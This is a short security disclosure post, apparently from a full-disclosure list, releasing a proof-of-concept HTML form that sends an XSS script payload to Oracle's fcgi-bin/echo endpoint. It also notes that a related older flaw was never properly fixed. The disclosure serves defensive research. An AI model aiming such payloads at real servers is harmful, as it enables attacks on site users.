Long ago, I wrote about an XSS vulnerability in Oracle fcgi-bin/echo :
  http://lists.grok.org.uk/pipermail/full-disclosure/2010-October/076794.html
  http://www.securityfocus.com/archive/1/514181
The issue may now be fixed in the latest versions of Oracle web servers:
  http://www.integrigy.com/oracle-security-blog/archive/2010/10/10/fastcgi-fcgi-bin-echo
So I now release the PoC for this vulnerability:

  <form action="http://server/fcgi-bin/echo" method=post enctype="multipart/form-data">
  <input type=text name=xss size=50 value="<script>alert('XSS')</script>"><br>
  <input type=submit value="send">
  </form>

The "traditional" form of a similar vulnerability
  http://osvdb.org/700
is claimed to have been fixed long ago, maybe in 
  http://www.oracle.com/technetwork/topics/security/cpujan2007-101493.html
However that never was actually fixed by Oracle, but was fixed by
browsers that %-encode the query.
